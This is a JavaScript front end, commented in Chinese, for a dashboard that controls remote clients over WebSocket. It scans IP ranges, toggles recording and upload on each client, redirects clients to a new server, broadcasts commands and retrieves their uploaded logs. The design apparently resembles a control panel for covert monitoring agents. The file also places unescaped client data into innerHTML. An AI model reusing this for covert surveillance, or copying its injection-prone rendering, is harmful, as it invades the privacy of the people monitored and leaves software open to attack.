// 全局变量
let ws = null;
let clients = [];
let currentClientId = null;
let reconnectTimer = null;
const WS_URL = `ws://${window.location.host}`;
let autoRefreshTimer = null;
const AUTO_REFRESH_INTERVAL = 1000; // 1秒

// DOM 元素
const wsStatus = document.getElementById('wsStatus');
const wsStatusText = document.getElementById('wsStatusText');
const clientsTable = document.getElementById('clientsTable');
const logClientSelect = document.getElementById('logClientSelect');
const logsTable = document.getElementById('logsTable');
const scanProgress = document.getElementById('scanProgress');
const toast = document.getElementById('toast');

// 页面切换
document.querySelectorAll('.nav-item').forEach(item => {
    item.addEventListener('click', () => {
        const page = item.dataset.page;
        document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
        item.classList.add('active');
        document.querySelectorAll('.page').forEach(p => p.style.display = 'none');
        document.getElementById(page + 'Page').style.display = 'block';
        if (page === 'logs') {
            populateClientSelect();
            if (logClientSelect.value) refreshLogs();
            startAutoRefresh();
        } else {
            stopAutoRefresh();
        }
    });
});

// 初始化 WebSocket
function connectWebSocket() {
    if (ws && ws.readyState === WebSocket.OPEN) return;

    ws = new WebSocket(WS_URL);
    ws.onopen = () => {
        wsStatus.classList.add('connected');
        wsStatusText.textContent = '已连接';
        if (reconnectTimer) {
            clearTimeout(reconnectTimer);
            reconnectTimer = null;
        }
        showToast('已连接到服务器', 'success');
    };

    ws.onclose = () => {
        wsStatus.classList.remove('connected');
        wsStatusText.textContent = '断开，尝试重连...';
        reconnectTimer = setTimeout(connectWebSocket, 3000);
    };

    ws.onerror = (err) => {
        console.error('WebSocket 错误:', err);
    };

    ws.onmessage = (event) => {
        try {
            const data = JSON.parse(event.data);
            handleWebSocketMessage(data);
        } catch (e) {
            console.error('解析消息失败:', e);
        }
    };
}

// 处理 WebSocket 消息
function handleWebSocketMessage(data) {
    switch (data.type) {
        case 'clients_list':
            clients = data.clients;
            renderClientsTable();
            populateClientSelect();
            break;
        case 'client_connected':
        case 'client_offline':
        case 'client_deleted':
            if (data.client) {
                updateClientInList(data.client);
            } else if (data.clientId) {
                removeClientFromList(data.clientId);
            }
            populateClientSelect();
            break;
        case 'client_response':
            console.log('客户端响应:', data);
            if (data.response && data.response.data) {
                const client = clients.find(c => c.id === data.clientId);
                if (client) {
                    if (data.response.data.recording !== undefined) {
                        client.recording = data.response.data.recording;
                    }
                    if (data.response.data.upload_enabled !== undefined) {
                        client.uploadEnabled = data.response.data.upload_enabled;
                    }
                    renderClientsTable();
                }
            }
            break;
        case 'command_result':
            console.log('命令结果:', data.result);
            if (data.result.success) {
                showToast('命令已发送', 'success');
            } else {
                showToast('命令发送失败: ' + data.result.error, 'error');
            }
            break;
        case 'broadcast_result':
            const successCount = data.results.filter(r => r.success).length;
            showToast(`广播完成: ${successCount}/${data.results.length} 成功`, 'success');
            break;
        case 'scan_complete':
            scanProgress.classList.remove('show');
            showToast(`扫描完成，发现 ${data.found.length} 个客户端`, 'success');
            break;
        case 'scan_error':
            scanProgress.classList.remove('show');
            showToast('扫描失败: ' + data.message, 'error');
            break;
        case 'connect_result':
            showToast(`成功连接 ${data.client.ip}:${data.client.port}`, 'success');
            hideModal('connectModal');
            break;
        case 'connect_error':
            showToast('连接失败: ' + data.message, 'error');
            break;
        case 'delete_result':
            if (data.success) {
                showToast('客户端已删除', 'success');
            } else {
                showToast('删除失败: ' + data.error, 'error');
            }
            break;
        default:
            console.log('未知消息类型:', data);
    }
}

// 更新客户端列表中的某个客户端
function updateClientInList(client) {
    const index = clients.findIndex(c => c.id === client.id);
    if (index >= 0) {
        clients[index] = client;
    } else {
        clients.push(client);
    }
    renderClientsTable();
}

// 从列表中移除客户端
function removeClientFromList(clientId) {
    clients = clients.filter(c => c.id !== clientId);
    renderClientsTable();
    populateClientSelect();
}

// 渲染客户端表格
function renderClientsTable() {
    if (clients.length === 0) {
        clientsTable.innerHTML = '<tr><td colspan="7" class="empty-state">暂无客户端</td></tr>';
        return;
    }

    let html = '';
    clients.forEach(client => {
        const statusClass = client.status === 'online' ? 'status-online' : 'status-offline';
        const recordClass = client.recording ? 'status-recording' : 'status-paused';
        const uploadClass = client.uploadEnabled ? 'status-recording' : 'status-paused';
        const lastSeen = client.lastSeen ? new Date(client.lastSeen).toLocaleString() : '从未';

        html += `<tr>
            <td>${client.ip}</td>
            <td>${client.port}</td>
            <td><span class="status-badge ${statusClass}">${client.status}</span></td>
            <td><span class="status-badge ${recordClass}">${client.recording ? '录制中' : '已暂停'}</span></td>
            <td><span class="status-badge ${uploadClass}">${client.uploadEnabled ? '已启用' : '未启用'}</span></td>
            <td>${lastSeen}</td>
            <td>
                <div class="action-btns">
                    <button class="btn btn-sm btn-primary" onclick="showClientModal('${client.id}')">详情</button>
                    ${client.status === 'online' ? 
                        `<button class="btn btn-sm btn-danger" onclick="disconnectClient('${client.id}')">断开</button>` : ''}
                    <button class="btn btn-sm btn-danger" onclick="deleteClient('${client.id}')">删除</button>
                </div>
            </td>
        </tr>`;
    });
    clientsTable.innerHTML = html;
}

// 填充日志页面的客户端下拉框
function populateClientSelect() {
    let html = '<option value="">选择客户端</option>';
    clients.forEach(client => {
        html += `<option value="${client.id}">${client.ip}:${client.port} (${client.status})</option>`;
    });
    logClientSelect.innerHTML = html;
}

// 显示客户端详情模态框
function showClientModal(clientId) {
    const client = clients.find(c => c.id === clientId);
    if (!client) return;

    currentClientId = clientId;
    document.getElementById('clientModalTitle').textContent = `客户端: ${client.ip}:${client.port}`;
    
    // 概览信息
    const infoHtml = `
        <p><strong>ID:</strong> ${client.id}</p>
        <p><strong>IP:</strong> ${client.ip}</p>
        <p><strong>端口:</strong> ${client.port}</p>
        <p><strong>状态:</strong> ${client.status}</p>
        <p><strong>录制状态:</strong> ${client.recording ? '录制中' : '已暂停'}</p>
        <p><strong>上传状态:</strong> ${client.uploadEnabled ? '已启用' : '未启用'}</p>
        <p><strong>最后连接:</strong> ${client.lastSeen ? new Date(client.lastSeen).toLocaleString() : '从未'}</p>
    `;
    document.getElementById('clientInfo').innerHTML = infoHtml;

    // 加载客户端日志列表
    loadClientLogs(clientId);

    document.getElementById('clientModal').classList.add('show');
}

// 加载客户端日志
async function loadClientLogs(clientId) {
    const client = clients.find(c => c.id === clientId);
    if (!client) return;

    try {
        const response = await fetch(`/api/clients/${clientId}/logs`);
        const logs = await response.json();
        if (logs.length === 0) {
            document.getElementById('clientLogs').innerHTML = '<p>暂无日志文件</p>';
            return;
        }
        let html = '<ul style="list-style: none; padding: 0;">';
        logs.forEach(log => {
            html += `<li style="padding: 0.5rem; border-bottom: 1px solid #eee; display: flex; justify-content: space-between;">
                <span>${log.filename}</span>
                <div class="action-btns">
                    <button class="btn btn-sm btn-primary" onclick="viewLog('${clientId}', '${log.filename}')">查看</button>
                    <button class="btn btn-sm btn-success" onclick="downloadLog('${clientId}', '${log.filename}')">下载</button>
                    <button class="btn btn-sm btn-danger" onclick="deleteLog('${clientId}', '${log.filename}')">删除</button>
                </div>
            </li>`;
        });
        html += '</ul>';
        document.getElementById('clientLogs').innerHTML = html;
    } catch (e) {
        console.error('加载日志失败:', e);
        document.getElementById('clientLogs').innerHTML = '<p>加载失败</p>';
    }
}

// 模态框标签切换
document.querySelectorAll('.tab').forEach(tab => {
    tab.addEventListener('click', () => {
        const tabName = tab.dataset.tab;
        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
        document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
        tab.classList.add('active');
        document.getElementById(tabName + 'Tab').classList.add('active');
    });
});

// 发送命令给当前选中的客户端
function sendCommand(action, params = {}) {
    if (!currentClientId) {
        showToast('请先选择客户端', 'error');
        return;
    }
    ws.send(JSON.stringify({
        type: 'command',
        clientId: currentClientId,
        command: { action, ...params }
    }));
}

// 广播命令
function broadcastCommand(action, params = {}) {
    ws.send(JSON.stringify({
        type: 'broadcast_command',
        command: { action, ...params }
    }));
}

// 设置服务器地址
function setServer() {
    const host = document.getElementById('serverHost').value;
    const port = document.getElementById('serverPort').value;
    if (!host || !port) {
        showToast('请填写服务器地址和端口', 'error');
        return;
    }
    sendCommand('set_server', { host, port: parseInt(port) });
}

// 断开客户端连接
function disconnectClient(clientId) {
    if (!confirm('确定断开该客户端连接吗？')) return;
    ws.send(JSON.stringify({
        type: 'disconnect_client',
        clientId: clientId
    }));
}

// 删除客户端
function deleteClient(clientId) {
    if (!confirm('确定要删除该客户端吗？此操作会从数据库中永久移除记录。')) return;
    ws.send(JSON.stringify({
        type: 'delete_client',
        clientId: clientId
    }));
    if (currentClientId === clientId) {
        hideModal('clientModal');
    }
}

// 手动连接
function manualConnect() {
    const ip = document.getElementById('connectIp').value;
    const port = parseInt(document.getElementById('connectPort').value);
    if (!ip || !port) {
        showToast('请填写 IP 和端口', 'error');
        return;
    }
    ws.send(JSON.stringify({
        type: 'manual_connect',
        ip, port
    }));
}

// 扫描网络
function scanNetwork() {
    const startIp = document.getElementById('scanStartIp').value;
    const endIp = document.getElementById('scanEndIp').value;
    const portsStr = document.getElementById('scanPorts').value;
    if (!startIp || !endIp) {
        showToast('请填写起始和结束 IP', 'error');
        return;
    }
    const ports = portsStr.split(',').map(p => parseInt(p.trim())).filter(p => !isNaN(p));
    ws.send(JSON.stringify({
        type: 'scan_network',
        startIp, endIp, ports
    }));
    scanProgress.classList.add('show');
    hideModal('scanModal');
}

// 刷新日志列表（日志页面）
async function refreshLogs() {
    const clientId = logClientSelect.value;
    if (!clientId) {
        showToast('请选择客户端', 'error');
        return;
    }
    try {
        const response = await fetch(`/api/clients/${clientId}/logs`);
        const logs = await response.json();
        renderLogsTable(logs, clientId);
    } catch (e) {
        console.error('刷新日志失败:', e);
        showToast('刷新失败', 'error');
    }
}

// 渲染日志表格（包含删除按钮）
function renderLogsTable(logs, clientId) {
    if (logs.length === 0) {
        logsTable.innerHTML = '<tr><td colspan="4" class="empty-state">暂无日志文件</td></tr>';
        return;
    }
    let html = '';
    logs.forEach(log => {
        const size = formatFileSize(log.size);
        const time = log.uploadTime ? new Date(log.uploadTime).toLocaleString() : '未知';
        html += `<tr>
            <td>${log.filename}</td>
            <td>${size}</td>
            <td>${time}</td>
            <td>
                <div class="action-btns">
                    <button class="btn btn-sm btn-primary" onclick="viewLog('${clientId}', '${log.filename}')">查看</button>
                    <button class="btn btn-sm btn-success" onclick="downloadLog('${clientId}', '${log.filename}')">下载</button>
                    <button class="btn btn-sm btn-danger" onclick="deleteLog('${clientId}', '${log.filename}')">删除</button>
                </div>
            </td>
        </tr>`;
    });
    logsTable.innerHTML = html;
}

// 查看日志内容
async function viewLog(clientId, filename) {
    try {
        const response = await fetch(`/api/clients/${clientId}/logs/${filename}/raw`);
        const content = await response.text();
        document.getElementById('logModalTitle').textContent = filename;
        document.getElementById('logContent').textContent = content;
        document.getElementById('logModal').classList.add('show');
    } catch (e) {
        console.error('查看日志失败:', e);
        showToast('查看失败', 'error');
    }
}

// 下载日志
function downloadLog(clientId, filename) {
    window.open(`/api/clients/${clientId}/logs/${filename}/download`, '_blank');
}

// 删除日志
async function deleteLog(clientId, filename) {
    if (!confirm(`确定要删除日志文件 ${filename} 吗？此操作不可恢复！`)) {
        return;
    }

    try {
        const response = await fetch(`/api/clients/${clientId}/logs/${filename}`, {
            method: 'DELETE'
        });
        const result = await response.json();
        if (response.ok) {
            showToast(`日志 ${filename} 已删除`, 'success');
            // 刷新当前显示的日志列表
            if (currentClientId === clientId && document.getElementById('clientModal').classList.contains('show')) {
                loadClientLogs(clientId);
            }
            if (logClientSelect.value === clientId) {
                refreshLogs();
            }
        } else {
            showToast(`删除失败: ${result.error || '未知错误'}`, 'error');
        }
    } catch (e) {
        console.error('删除日志失败:', e);
        showToast('删除请求失败', 'error');
    }
}

// 格式化文件大小
function formatFileSize(bytes) {
    if (bytes < 1024) return bytes + ' B';
    if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(2) + ' KB';
    return (bytes / (1024 * 1024)).toFixed(2) + ' MB';
}

// 显示模态框
function showConnectModal() {
    document.getElementById('connectModal').classList.add('show');
}

function showScanModal() {
    document.getElementById('scanModal').classList.add('show');
}

function hideModal(modalId) {
    document.getElementById(modalId).classList.remove('show');
}

// 保存设置
function saveSettings() {
    const interval = document.getElementById('heartbeatInterval').value;
    const timeout = document.getElementById('connectTimeout').value;
    showToast(`设置已保存 (心跳: ${interval}ms, 超时: ${timeout}ms)`, 'success');
}

// Toast 提示
function showToast(message, type = 'success') {
    toast.textContent = message;
    toast.className = `toast ${type} show`;
    setTimeout(() => {
        toast.classList.remove('show');
    }, 3000);
}

// 日志页面客户端选择变化
logClientSelect.addEventListener('change', () => {
    refreshLogs();
    if (autoRefreshTimer) {
        stopAutoRefresh();
        startAutoRefresh();
    }
});

// 日志搜索过滤
document.getElementById('logSearch')?.addEventListener('input', (e) => {
    const keyword = e.target.value.toLowerCase();
    const rows = logsTable.querySelectorAll('tr');
    rows.forEach(row => {
        const text = row.textContent.toLowerCase();
        row.style.display = text.includes(keyword) ? '' : 'none';
    });
});

//自动刷新
function startAutoRefresh() {
    if (autoRefreshTimer) return;
    autoRefreshTimer = setInterval(() => {
        if (logClientSelect.value) {
            refreshLogs();
        }
    }, AUTO_REFRESH_INTERVAL);
}

function stopAutoRefresh() {
    if (autoRefreshTimer) {
        clearInterval(autoRefreshTimer);
        autoRefreshTimer = null;
    }
}

// 页面关闭前清理定时器
window.addEventListener('beforeunload', () => {
    stopAutoRefresh();
});

// 初始化连接
connectWebSocket();